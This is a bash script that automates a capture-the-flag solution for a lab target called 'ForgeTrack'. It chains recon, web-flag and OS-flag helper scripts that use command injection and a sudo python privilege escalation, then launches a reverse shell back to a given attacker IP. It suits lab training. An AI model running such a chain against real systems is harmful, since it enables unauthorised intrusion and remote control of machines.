#!/usr/bin/env bash
#
# One-shot ATTACKER-MACHINE script for an authorised ForgeTrack lab.
# Run this from your Kali/attacker VM, never from inside the target VM.
#
# Usage:
#   bash attack.sh http://VM_IP ATTACKER_IP
#   TARGET=http://VM_IP ATK=ATTACKER_IP bash attack.sh
#
# Phases: recon -> four web flags -> both OS flags -> interactive shell/privesc.

set -uo pipefail

TARGET="${1:-${TARGET:-}}"
ATK="${2:-${ATK:-}}"
PORT="${PORT:-4444}"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if [[ -z "$TARGET" || "$TARGET" == *VM_IP* ]]; then
  echo "Usage: bash attack.sh http://VM_IP ATTACKER_IP" >&2
  exit 1
fi
if [[ -z "$ATK" || "$ATK" == *ATTACKER* ]]; then
  ATK="$(ip -4 addr show scope global 2>/dev/null \
        | awk '/inet / {gsub("/.*","",$2); print $2; exit}')"
fi
if [[ -z "$ATK" ]]; then
  echo "Could not detect the attacker IP. Pass it as the second argument." >&2
  exit 1
fi

TARGET="${TARGET%/}"

echo "############################################################"
echo "# ATTACKER: $0"
echo "# target : $TARGET"
echo "# source : $ATK (reverse shell callback)"
echo "# port   : $PORT"
echo "############################################################"

echo
echo "== 1. Recon =="
curl -sSI "$TARGET/" | head -5 || true
curl -sS "$TARGET/" | grep -o 'Built for the next lap' || true
curl -sS -o /dev/null -w 'GET /diagnostics -> %{http_code}\n' "$TARGET/diagnostics"

echo
echo "== 2. Web flags =="
bash "$HERE/get-web-flags.sh" "$TARGET" || echo "WARNING: web flag phase had errors."

echo
echo "== 3. OS flags (injection + sudo python) =="
bash "$HERE/get-os-flags.sh" "$TARGET" || echo "WARNING: OS flag phase had errors."

echo
echo "== 4. Interactive shell and privesc =="
python3 "$HERE/get-reverse-shell.py" "$TARGET" --attacker "$ATK" --port "$PORT" \
  || echo "WARNING: reverse shell phase had errors."

echo
echo "Attacker run complete. Submit the captured flags to TryHackMe."
